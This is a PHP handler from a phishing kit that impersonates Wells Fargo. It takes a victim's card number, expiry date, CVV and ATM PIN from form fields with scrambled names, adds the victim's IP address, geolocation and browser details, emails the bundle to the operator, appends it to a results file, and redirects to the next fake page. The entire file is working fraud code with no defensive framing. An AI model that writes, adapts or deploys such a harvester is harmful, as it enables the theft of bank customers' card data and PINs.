<?php

$cardno = $_POST['jskdjdksk'];
$expireDate = $_POST['hsjeksjsk'];
$cardcvv = $_POST['jsndksjs'];
$atmPin = $_POST['akskeksls'];

require_once('email_config.php');
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();

//get user's ip address
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

if ($cardno != null && $expireDate != null && $cardcvv != null && $atmPin != null ) {

    $message = "";
    $message .= "---|Wells-fargo|---\n";
    $message .= "Card Number: " .$cardno. "\n";
    $message .= "Expiration Date: " .$expireDate. "\n";
    $message .= "CVV: " .$cardcvv. "\n";
    $message .= "Card PIN: " .$atmPin. "\n";
    $message .= "IP : " .$ip. "\n";
    $message .= "--------------------------\n";
    $message .=     "City: {$geoplugin->city}\n";
    $message .=     "Region: {$geoplugin->region}\n";
    $message .=     "Country Name: {$geoplugin->countryName}\n";
    $message .=     "Country Code: {$geoplugin->countryCode}\n";
    $message .=     "Date: ".date("D M d, Y g:i a")."\n";
    $message .=     "Browser Details: ".$_SERVER['HTTP_USER_AGENT']."\n";
    $message .= "--------------------------\n";


    $subj = " Wells |- " . $ip . "\n";

    mail($email, $subj, $message, $from);

    file_put_contents('../wells_rezlt.txt', $message, FILE_APPEND);

    header("location: ../pafe_x.php?id=$praga$praga&session=$praga$praga");
} else {
    //exit(header('Location: https://www.wellsfargo.com/'));
    header("location: ../pafe_e.php?id=$praga$praga&session=$praga$praga");
}

?>